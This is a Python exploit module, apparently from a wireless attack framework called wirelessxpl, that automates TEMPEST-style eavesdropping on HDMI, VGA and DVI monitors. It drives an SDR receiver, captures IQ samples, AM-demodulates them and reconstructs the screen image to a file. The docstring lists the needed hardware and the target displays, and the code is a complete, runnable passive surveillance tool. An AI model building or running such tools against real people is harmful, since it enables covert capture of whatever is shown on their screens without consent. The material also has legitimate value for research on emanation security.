# Author: André Henrique (LinkedIn/X: @mrhenrike)
import os
import shutil
import struct
import subprocess
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """TempestSDR HDMI Emanation Eavesdropping.

    Reconstructs the image displayed on a target monitor by capturing
    unintentional electromagnetic (EM) emanations from HDMI cables and
    display circuitry.  The attack is entirely passive and works at
    distances of several meters with a directional antenna.

    The module automates the TempestSDR pipeline: SDR device
    configuration, frequency tuning to the target pixel clock harmonic,
    signal capture, AM demodulation, and frame reconstruction.

    Hardware necessario:
      - RTL-SDR V3 (ou HackRF One / USRP B200) como receptor SDR
      - Antena direcional Yagi UHF (300 MHz-1.7 GHz) ou log-periodic
      - Cabo coaxial SMA de baixa perda
      - (Opcional) Amplificador de baixo ruido (LNA) para distancias maiores

    Referencia: "Compromising Electromagnetic Emanations of Wired and
    Wireless Keyboards" (Vuagnoux & Pasini, 2009) e toolkit TempestSDR
    de Martin Marinov.

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "TempestSDR HDMI Emanation Eavesdropping",
        "description": (
            "Captures and reconstructs video displayed on a target monitor "
            "by receiving unintentional EM emanations from HDMI cables.  "
            "Entirely passive; effective at several meters with a directional "
            "antenna.  Hardware: RTL-SDR V3 (ou HackRF One) + antena "
            "direcional Yagi UHF + cabo SMA.  Opcional: LNA para maior "
            "alcance."
        ),
        "authors": (
            "Martin Marinov (TempestSDR toolkit)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://github.com/martinmarinov/TempestSDR",
            "https://www.cl.cam.ac.uk/~mgk25/pet2004-tempest.pdf",
        ),
        "disclosure_date": "2020-01-01",
        "platform": "linux",
        "arch": "all",
        "privileged": True,
        "targets": (
            "Any monitor with HDMI connection (no encryption or weak HDCP)",
            "VGA monitors (stronger emanations, easier to capture)",
            "DVI-D monitors (similar to HDMI emanation profile)",
        ),
    }

    target = OptIP("", "Not used (passive EM capture)")
    port = OptPort(1, "Not used (passive EM capture)")
    timeout = OptFloat(30.0, "Capture duration in seconds")
    center_freq = OptFloat(350e6, "Center frequency in Hz (pixel clock harmonic)")
    sample_rate = OptFloat(2.4e6, "SDR sample rate in samples/sec")
    gain = OptFloat(40.0, "SDR gain in dB")
    sdr_device = OptString("rtlsdr", "SDR device type: rtlsdr, hackrf, uhd")
    output_dir = OptString("/tmp/tempest_capture", "Directory to store captured frames")
    width = OptInteger(1920, "Target display horizontal resolution")
    height = OptInteger(1080, "Target display vertical resolution")
    refresh_rate = OptFloat(60.0, "Target display refresh rate in Hz")

    _SDR_TOOLS = {
        "rtlsdr": "rtl_sdr",
        "hackrf": "hackrf_transfer",
        "uhd": "uhd_rx_cfile",
    }

    def _pixel_clock_hz(self) -> float:
        """Estimate pixel clock from resolution and refresh rate."""
        h_total = self.width * 1.25
        v_total = self.height * 1.05
        return h_total * v_total * self.refresh_rate

    def _find_sdr_tool(self) -> str | None:
        tool = self._SDR_TOOLS.get(str(self.sdr_device))
        if tool and shutil.which(tool):
            return tool
        return None

    def _capture_iq_samples(self, tool: str, output_file: str) -> bool:
        """Capture raw IQ samples from the SDR device."""
        dev = str(self.sdr_device)
        if dev == "rtlsdr":
            cmd = [
                tool,
                "-f", str(int(self.center_freq)),
                "-s", str(int(self.sample_rate)),
                "-g", str(int(self.gain)),
                "-n", str(int(self.sample_rate * self.timeout)),
                output_file,
            ]
        elif dev == "hackrf":
            cmd = [
                tool,
                "-r", output_file,
                "-f", str(int(self.center_freq)),
                "-s", str(int(self.sample_rate)),
                "-a", "1",
                "-l", str(int(self.gain)),
                "-n", str(int(self.sample_rate * self.timeout)),
            ]
        else:
            cmd = [
                tool,
                "--freq", str(self.center_freq),
                "--rate", str(self.sample_rate),
                "--gain", str(self.gain),
                "--duration", str(self.timeout),
                output_file,
            ]

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                timeout=self.timeout + 10,
            )
            return result.returncode == 0
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return False

    def _am_demodulate(self, iq_data: bytes) -> list[float]:
        """AM-demodulate raw IQ samples to recover video signal envelope."""
        samples = []
        for i in range(0, len(iq_data) - 1, 2):
            real = (iq_data[i] - 128) / 128.0
            imag = (iq_data[i + 1] - 128) / 128.0
            magnitude = (real * real + imag * imag) ** 0.5
            samples.append(magnitude)
        return samples

    def _reconstruct_frame(self, demod: list[float]) -> list[list[int]]:
        """Reconstruct a single video frame from demodulated signal."""
        samples_per_line = int(self.sample_rate / (self.height * self.refresh_rate))
        frame = []
        for row in range(self.height):
            line_start = row * samples_per_line
            line_end = line_start + samples_per_line
            if line_end > len(demod):
                break
            line_samples = demod[line_start:line_end]
            pixels_per_sample = self.width / max(len(line_samples), 1)
            row_pixels = []
            for col in range(self.width):
                idx = int(col / max(pixels_per_sample, 0.001))
                idx = min(idx, len(line_samples) - 1) if line_samples else 0
                pixel_val = int(line_samples[idx] * 255) if line_samples else 0
                pixel_val = max(0, min(255, pixel_val))
                row_pixels.append(pixel_val)
            frame.append(row_pixels)
        return frame

    def _save_pgm(self, frame: list[list[int]], path: str) -> None:
        """Save reconstructed frame as PGM (portable graymap)."""
        h = len(frame)
        w = len(frame[0]) if frame else 0
        with open(path, "wb") as f:
            f.write(f"P5\n{w} {h}\n255\n".encode())
            for row in frame:
                f.write(bytes(row))

    @mute
    def check(self) -> bool:
        """Verify that the SDR tool is installed and accessible."""
        tool = self._find_sdr_tool()
        return tool is not None

    def run(self) -> None:
        tool = self._find_sdr_tool()
        if tool is None:
            print_error(
                f"SDR tool for '{self.sdr_device}' not found.  "
                "Install rtl-sdr, hackrf, or UHD utils."
            )
            return

        pixel_clk = self._pixel_clock_hz()
        print_success(
            f"SDR tool '{tool}' found.  "
            f"Estimated pixel clock: {pixel_clk / 1e6:.2f} MHz"
        )
        print_status(
            f"Tuning to {self.center_freq / 1e6:.2f} MHz, "
            f"sample rate {self.sample_rate / 1e6:.1f} Msps, "
            f"gain {self.gain} dB"
        )
        self._exploit()

    def _exploit(self) -> None:
        os.makedirs(str(self.output_dir), exist_ok=True)
        iq_file = os.path.join(str(self.output_dir), "capture.raw")

        tool = self._find_sdr_tool()
        if tool is None:
            print_error("SDR tool not available")
            return

        print_status(f"Capturing IQ samples for {self.timeout}s ...")
        if not self._capture_iq_samples(tool, iq_file):
            print_error("IQ capture failed or timed out")
            return

        if not os.path.exists(iq_file):
            print_error("Capture file not created")
            return

        with open(iq_file, "rb") as f:
            iq_data = f.read()

        print_status(f"Captured {len(iq_data)} bytes of IQ data")
        print_status("AM-demodulating to recover video envelope ...")

        demod = self._am_demodulate(iq_data)
        print_status(f"Demodulated {len(demod)} samples")

        print_status(
            f"Reconstructing frame ({self.width}x{self.height} @ "
            f"{self.refresh_rate} Hz) ..."
        )
        frame = self._reconstruct_frame(demod)

        if frame:
            pgm_path = os.path.join(str(self.output_dir), "frame_0001.pgm")
            self._save_pgm(frame, pgm_path)
            print_success(f"Frame saved to {pgm_path}")
            print_info(
                "Review the PGM file to assess capture quality.  "
                "Adjust center_freq closer to a pixel clock harmonic "
                "for sharper results.  Use an LNA for greater range."
            )
        else:
            print_error("Frame reconstruction produced no data")
